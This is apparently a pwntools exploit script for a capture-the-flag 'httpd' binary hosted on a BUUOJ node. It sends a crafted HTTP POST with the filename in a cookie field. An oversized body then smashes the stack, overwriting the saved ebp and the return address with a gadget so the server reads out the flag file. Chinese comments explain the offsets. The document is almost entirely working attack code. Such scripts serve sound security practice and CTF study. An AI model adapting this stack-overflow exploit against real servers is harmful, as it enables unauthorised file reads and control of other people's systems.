# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './httpd'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26361'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

gadget_addr = 0x8049302
bss_addr = 0x0804C180
ebp_offset = 0x42c
flag_name = 'flag'

payload = '''POST /submit HTTP/1.1
Content-Length: 0
Cookie: Username=aaa;Messages=%s

'''% flag_name

# 这里的Messages输入到了bss段上
# 之后通过不合理的 Content-Length 造成栈溢出读取文件并输出

payload = payload.replace('\n', '\r\n')
se(payload)
payload = 'a' * (0x82E - len(flag_name) - 1) + p32(bss_addr + 0x1e + ebp_offset) + p32(gadget_addr)

# 关于这个 ebp 的内容，在后面调用的函数的地方有个 lea eax,[ebp - 0x42c]的操作
# 所以这个 ebp 的内容需要为 flag 地址加上 0x420

dbg('*0x08049550')
se(payload.ljust(0x5000,'\x00'))


p.interactive()

'''
@File    :   httpd.py
@Time    :   2021/08/30 13:19:06
@Author  :   Niyah 
'''